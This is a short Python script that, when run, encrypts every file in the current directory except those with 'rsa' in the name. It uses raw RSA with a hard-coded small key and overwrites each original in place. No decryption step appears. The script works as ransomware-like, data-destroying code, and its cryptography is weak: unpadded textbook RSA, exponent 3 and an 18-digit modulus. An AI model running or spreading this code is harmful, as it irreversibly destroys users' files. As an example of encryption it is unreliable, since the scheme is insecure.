import numpy as np
import os


def encrypt(file_name, e, n):

    file = open(file_name, 'rb')

    arr = []
    end = 0

    while byte := file.read(4):

        temp = 0
        end = len(byte)

        for i in range(len(byte)):
            
            temp += byte[i] * pow(256, i)

        arr.append(pow(temp, e, n))

    arr.append(end)
    file.close()

    file = open(file_name, 'wb')
    np.save(file, arr)
    file.close()


def main():

    e = 3
    n = 999998706000358093

    files = [f for f in os.listdir() if os.path.isfile(f)]

    for file in files:

        if 'rsa' not in file.lower():

            encrypt(file, e, n)


main()
